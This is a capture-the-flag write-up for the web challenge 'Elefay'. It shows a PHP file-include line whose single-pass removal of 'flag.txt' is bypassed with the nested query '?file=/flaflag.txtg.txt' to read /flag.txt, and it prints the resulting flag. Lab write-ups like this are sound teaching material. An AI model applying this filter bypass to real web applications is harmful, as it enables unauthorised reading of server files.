# Elefay
> Flag file in /flag.txt

Author: vannn

## About the Challenge
This challenge gives a website like this

<img width="1850" height="1006" alt="Screenshot from 2025-09-15 21-24-55" src="https://github.com/user-attachments/assets/4d50810e-a6f3-4f93-be97-55d1ae1d162f" />

## How to Solve?

lets see this line

```
  $file = preg_replace('/flag\.txt/i', '', preg_replace('/\.\.\//', '', $_GET['file']));
```

this function will remove flag.txt when we browse /flag.txt. but it only remove 1 times (not looping until no one flag.txt detected) also there is a function that prevents users from performing directory traversal. But don't worry about that because we don't need it, the flag is in /flag.txt. so we can use this vulnerability to use query like

```
http://48794f12-d7c6-44ed-8412-6d0b11df1d64.chall.intersec.hcs-team.com/?file=/flaflag.txtg.txt
```

<img width="1850" height="1006" alt="Screenshot from 2025-09-15 21-34-53" src="https://github.com/user-attachments/assets/4cd68ff8-5c49-45a9-81d7-f182637557a3" />


Boom. we got the flag

## Flag
```
HCS{k4mu_k0k_j4g0_b4ng3t_s1h_b4n9_m44f_ya_soalny4_t3rlalu_g4mp4ng_bu4t_k4mu_:3_cb11b8ef-990d-4c6d-bbe6-883e50d96183}
```
